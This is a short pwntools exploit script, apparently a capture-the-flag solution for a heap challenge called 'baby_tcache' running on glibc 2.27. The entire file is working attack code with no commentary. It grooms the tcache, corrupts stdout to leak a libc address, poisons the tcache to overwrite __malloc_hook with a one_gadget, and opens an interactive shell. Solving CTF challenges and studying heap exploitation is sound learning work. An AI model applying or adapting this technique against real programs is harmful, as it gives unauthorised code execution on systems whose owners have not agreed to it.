from pwn import *
#context.log_level="debug"
def cmd(c):
	p.readuntil("Your choice: ")
	p.sendline(str(c))
def add(size,data):
	cmd(1)
	p.sendlineafter("Size:",str(size))
	p.sendafter("Data:",data)
def free(idx):
	cmd(2)
	p.sendlineafter("Index:",str(idx))
p=process("./baby_tcache")
libc=ELF("/libcx/x64/lib/libc-2.27.so")
for x in range(6):
	add(0x80,"\n")#0

add(0x38,"\n")#6
# fill up the tcache
add(0x8e0,"\n")#7 E
add(0x440,'\n')#8 C
add(0x80,'\n')#9 D
free(6)
free(7)

add(0x18,'\n')#6
add(0x80,'\n')#7

for x in range(6):
	free(x)
add(0x60,'\n')#0
free(0)
free(6)
free(9)
free(7)
free(8)
add(0x6f0,'\n')#0
add(0x20,'\n')#1
add(0x50,'\n')#2
add(0x100,'\x60\x37')#3
add(0x60,p64(0xdeadbeef))#4
#gdb.attach(p)
add(0x60,p64(0xfbad3c87)+p64(0)*3+'\x00')#5
p.read(8)
base=u64(p.read(6).ljust(8,'\x00'))-(0x7ffff7dd48b0-0x7ffff7a24000)
log.warning(hex(base))
free(4)
free(3)

libc.address=base
add(0x100,p64(libc.symbols['__malloc_hook']-35))
add(0x100,"\n")
one=base+0xdfa31
add(0x100,'\x00'*35+p64(one))
#
cmd(1)
p.sendlineafter("ize:",'\n')
p.interactive()


